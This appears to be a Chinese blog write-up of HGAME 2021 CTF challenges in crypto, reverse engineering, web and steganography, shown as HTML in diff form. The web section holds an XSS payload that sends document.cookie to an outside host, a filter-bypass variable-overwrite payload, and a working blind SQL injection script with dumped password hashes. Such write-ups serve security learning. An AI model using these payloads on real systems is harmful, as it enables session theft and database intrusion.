class="number">101</span>,<span class="number">65</span>,<span class="number">61</span>,<span class="number">61</span>]</span><br><span class="line">print(len(s))</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">    flag+=chr(j)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base64解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x</span><br></pre></td></tr></table></figure>
+
+<p>维吉尼亚密码 密钥为Liki</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n</span><br></pre></td></tr></table></figure>
+
+<p>栅栏密码 栏数为6 N型 拼凑格式成 <code>&#125;xxxxxxxxxxx&#123;xxxxx</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp&#123;rzntu</span><br></pre></td></tr></table></figure>
+
+<p>逆序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utnzr&#123;pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>凯撒密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="对称之美"><a href="#对称之美" class="headerlink" title="对称之美"></a>对称之美</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">cipher = bytes([ord(m)^ord(k) <span class="keyword">for</span> m, k <span class="keyword">in</span> zip(FLAG, itertools.cycle(key))])</span><br><span class="line"></span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure>
+
+<p>搜了半天 找到个xortools 不过没啥用:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.gpx.moe/2020/02/17/SJTU-CTF-2019-WriteUp-Crypto/">https://blog.gpx.moe/2020/02/17/SJTU-CTF-2019-WriteUp-Crypto/</a></p>
+<p>后来看wp才知道是MTP：<a target="_blank" rel="noopener" href="https://github.com/CameronLonsdale/MTP">https://github.com/CameronLonsdale/MTP</a>   这是啥玩意？</p>
+<p>分成16一组</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cipher=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">length = len(cipher)</span><br><span class="line">t = length // <span class="number">16</span></span><br><span class="line">f = open(<span class="string">&quot;cipher.ciphertexts&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, t):</span><br><span class="line">    print(cipher[i * <span class="number">16</span> : (i + <span class="number">1</span>) * <span class="number">16</span>].hex(), file=f)</span><br><span class="line">print(cipher[t * <span class="number">16</span> : <span class="number">-1</span>].hex(), file=f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>明文是一段包含flag的英文文献</p>
+<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>quipqiup直接解：<a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a></p>
+<p>不知道其它附件有啥用</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210131140708108.png" alt="image-20210131140708108"></p>
+<p>在后面加上2021就行</p>
+<h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h4><p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/vqcmca/vms5ep">https://www.yuque.com/cyberangel/vqcmca/vms5ep</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/vebs87">https://www.yuque.com/cyberangel/rg9gdm/vebs87</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/dis.html">https://docs.python.org/3/library/dis.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">4</span>           <span class="number">0</span> LOAD_GLOBAL              <span class="number">0</span> (input)</span><br><span class="line">              <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;give me your flag:\n&#x27;</span>)</span><br><span class="line">              <span class="number">4</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (raw_flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>           <span class="number">8</span> LOAD_GLOBAL              <span class="number">1</span> (list)</span><br><span class="line">             <span class="number">10</span> LOAD_FAST                <span class="number">0</span> (raw_flag)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">2</span> (<span class="number">6</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">3</span> (<span class="number">-1</span>)</span><br><span class="line">             <span class="number">16</span> BUILD_SLICE              <span class="number">2</span></span><br><span class="line">             <span class="number">18</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">20</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">1</span> (cipher)</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">24</span> LOAD_GLOBAL              <span class="number">2</span> (len)</span><br><span class="line">             <span class="number">26</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">28</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">2</span> (length)</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">32</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">             <span class="number">34</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">38</span> BINARY_FLOOR_DIVIDE</span><br><span class="line">             <span class="number">40</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">42</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">44</span> FOR_ITER                <span class="number">54</span> (to <span class="number">100</span>)</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">3</span> (i)</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (cipher)  </span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">52</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">54</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">56</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD</span><br><span class="line">             <span class="number">60</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">62</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">64</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">68</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">70</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">72</span> ROT_TWO</span><br><span class="line">             <span class="number">74</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">76</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">78</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">80</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">82</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">84</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">             <span class="number">86</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">88</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">90</span> BINARY_MULTIPLY</span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> STORE_SUBSCR</span><br><span class="line">             <span class="number">98</span> JUMP_ABSOLUTE           <span class="number">44</span></span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;  <span class="number">100</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">            <span class="number">102</span> STORE_FAST               <span class="number">4</span> (res)</span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>         <span class="number">104</span> LOAD_GLOBAL              <span class="number">3</span> (range)</span><br><span class="line">            <span class="number">106</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">            <span class="number">108</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">110</span> GET_ITER</span><br><span class="line">        &gt;&gt;  <span class="number">112</span> FOR_ITER                <span class="number">26</span> (to <span class="number">140</span>)</span><br><span class="line">            <span class="number">114</span> STORE_FAST               <span class="number">3</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>         <span class="number">116</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">118</span> LOAD_METHOD              <span class="number">4</span> (append)</span><br><span class="line">            <span class="number">120</span> LOAD_GLOBAL              <span class="number">5</span> (ord)</span><br><span class="line">            <span class="number">122</span> LOAD_FAST                <span class="number">1</span> (cipher)</span><br><span class="line">            <span class="number">124</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">126</span> BINARY_SUBSCR</span><br><span class="line">            <span class="number">128</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">            <span class="number">132</span> BINARY_XOR</span><br><span class="line">            <span class="number">134</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">            <span class="number">136</span> POP_TOP</span><br><span class="line">            <span class="number">138</span> JUMP_ABSOLUTE          <span class="number">112</span></span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>     &gt;&gt;  <span class="number">140</span> LOAD_GLOBAL              <span class="number">6</span> (bytes)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">144</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">146</span> LOAD_METHOD              <span class="number">7</span> (hex)</span><br><span class="line">            <span class="number">148</span> CALL_METHOD              <span class="number">0</span></span><br><span class="line">            <span class="number">150</span> STORE_FAST               <span class="number">4</span> (res)</span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>         <span class="number">152</span> LOAD_GLOBAL              <span class="number">8</span> (<span class="keyword">print</span>)</span><br><span class="line">            <span class="number">154</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;your flag: &#x27;</span>)</span><br><span class="line">            <span class="number">156</span> LOAD_FAST                <span class="number">4</span> (res)</span><br><span class="line">            <span class="number">158</span> BINARY_ADD</span><br><span class="line">            <span class="number">160</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">            <span class="number">162</span> POP_TOP</span><br><span class="line">            <span class="number">164</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">            <span class="number">166</span> RETURN_VALUE</span><br><span class="line">            </span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure>
+
+<p>换源出来的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">raw_flag = <span class="string">&#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span></span><br><span class="line">cipher = list(raw_flag[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">length = len(cipher)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length//<span class="number">2</span>):</span><br><span class="line">    cipher[<span class="number">2</span>*i+<span class="number">1</span>],cipher[i*<span class="number">2</span>] = cipher[i*<span class="number">2</span>],cipher[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    res.append(ord(cipher[i])^i)</span><br><span class="line"></span><br><span class="line">print(bytes(res).hex())</span><br></pre></td></tr></table></figure>
+
+<p>就一个异或和换位  逆向脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hex_flag = <span class="string">&#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span>.encode()</span><br><span class="line">res1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(hex_flag),<span class="number">2</span>):</span><br><span class="line">    res1.append(int(hex_flag[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(res1)</span><br><span class="line">res2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res1)):</span><br><span class="line">    res2.append(chr(res1[i]^i))</span><br><span class="line">print(res2)</span><br><span class="line">print(len(res2))</span><br><span class="line">res3 = res2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">28</span>//<span class="number">2</span>):</span><br><span class="line">    res3[<span class="number">2</span>*i+<span class="number">1</span>],res3[i*<span class="number">2</span>] = res3[i*<span class="number">2</span>],res3[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">print(res3)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(res3))</span><br></pre></td></tr></table></figure>
+
+<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h4><p><a target="_blank" rel="noopener" href="http://www.zip有源码/">www.zip有源码</a> 有个config.ini存放用户账号密码 MD5解不出来 一个用户的密码很奇怪 0e纯数字</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210208151736009.png" alt="image-20210208151736009"></p>
+<img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210208151826805.png" alt="image-20210208151826805" style="zoom:80%;">
+
+<p>这不就弱比较？不过好像没用到 关键点在 </p>
+<p><strong>lazy.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filter = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_k =&gt; $_v)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($filter <span class="keyword">as</span> $youBadBad)&#123;</span><br><span class="line">            $_k = str_replace($youBadBad, <span class="string">&#x27;&#x27;</span>, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; = $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动加载类，这样我也能少打字力，芜湖~</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auto</span>(<span class="params">$class_name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> $class_name . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">&#x27;auto&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里将GET POST的值全部声明成了变量 并且过滤SESSION只是替换为空 完全可以双写绕过</p>
+<p>得到flag的条件 </p>
+<p><strong>flag.php:</strong></p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210208153418592.png" alt="image-20210208153418592"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_SESSESSIONSION[username]&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="Liki的生日礼物"><a href="#Liki的生日礼物" class="headerlink" title="Liki的生日礼物"></a>Liki的生日礼物</h4><p>bp intruder一开 谁都不爱 不太懂 就理解成条件竞争吧 20线程 每次兑三个 </p>
+<h4 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h4><p>xss题目 测了下 发现碰到一些关键字会反转并替换标签  img标签不会反转 并且过滤了http</p>
+<p>最终构造payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;eikooc.tnemucod+&#x27;?/0009:1.1.1.1//:pt&#x27;+&#x27;th&#x27;=noitacol.tnemucod&quot;=rorreno &quot;onerror/&quot;=crs gmi<span class="tag">&lt;</span></span><br></pre></td></tr></table></figure>
+
+<p>反转过来就是 onerror是为了触发反转 </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/rorreno&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=&#x27;ht&#x27;+&#x27;tp://1.1.1.1:9000/?&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>http过滤使用字符串拼接 接收到token 带上访问<code>/flag</code>就行</p>
+<h4 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h4><p>bool盲注  将from 空格 select where等替换为空 双写绕过  这里有个技巧 不知道替换了哪些关键字 只需在substr里加上 比对跑出来的结果就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://200ok.liki.link/server.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        headers1=&#123;<span class="string">&#x27;Status&#x27;</span>:<span class="string">&quot;1&#x27; &amp;&amp; if(ascii(substr((selselectect/**/*/**/frfromom/**/week2sqli.f1111111144444444444g),&#123;&#125;,1))=&#123;&#125;,1,0) || &#x27;&quot;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        headers2=&#123;<span class="string">&#x27;Status&#x27;</span>:<span class="string">&quot;1&#x27; &amp;&amp; if(ascii(substr((selselectect/**/*/**/frfromom/**/week2sqli.f1111111144444444444g),&#123;&#125;,1))&gt;&#123;&#125;,1,0) || &#x27;&quot;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url,headers=headers1,verify=<span class="literal">False</span>)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;NETWORK ERROR&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url,headers=headers2,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;NETWORK ERROR&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.7.30-0ubuntu0.18.04.1-log</span></span><br><span class="line"><span class="comment"># information_schema,mysql,performance_schema,sys,week2sqli</span></span><br><span class="line"><span class="comment"># admin,ctf,mysql.session,mysql.sys,root</span></span><br><span class="line"><span class="comment"># ,,,*B5C6150DA828591E9B8C7A5F85FDE7855CE0B52B,*59419F0BF653D69723310B90585B040F3D434A23</span></span><br><span class="line"><span class="comment"># f1111111144444444444g,status</span></span><br><span class="line"><span class="comment"># ffffff14gggggg</span></span><br></pre></td></tr></table></figure>
+
+<p>扫目录发现database.php和phpmyadmin 注mysql库 注意mysql5.7 密码字段更改为authentication_string</p>
+<p>解不出来 淦 老实的注就出了</p>
+<h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><p>两个文件7z和jpg 7z文件名提示F5隐写 空密码不行 在图片备注里找到密码</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209133531629.png" alt="image-20210209133531629"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract Matryoshka.jpg  -p <span class="string">&quot;!LyJJ9bi&amp;M7E72*JyD&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>提取出来7z密码</p>
+<p>解压出来<code>01.jpg</code>残损二维码和另外一个<code>Steghide.7z</code> 同样在备注里有Steghide密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 01.jpg</span><br></pre></td></tr></table></figure>
+
+<p>分离出<code>01.jpg</code>和<code>Outguess.7z</code> 同样在备注里有Outguess密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;outguess -k &quot;z0GFieYAee%gdf0%lF&quot; -r 02.jpg hidden.txt</span><br></pre></td></tr></table></figure>
+
+<p>继续解压得到<code>03.jpg</code>和<code>JPHS.7z</code> 同样在备注里有JPHS密码</p>
+<p>使用工具提取就行</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209140514990.png" alt="image-20210209140514990"></p>
+<p>四张残缺二维码已经齐了 <code>mspaint</code>打开画图最后拼出来</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209140925608.png" alt="image-20210209140925608"></p>
+<h4 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h4><p>Stegslove分析出</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209143953225.png" alt="image-20210209143953225"></p>
+<p>扫描之后 得到一串字符串base64解码之后发现是</p>
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210209144734535.png" alt="image-20210209144734535"></p>
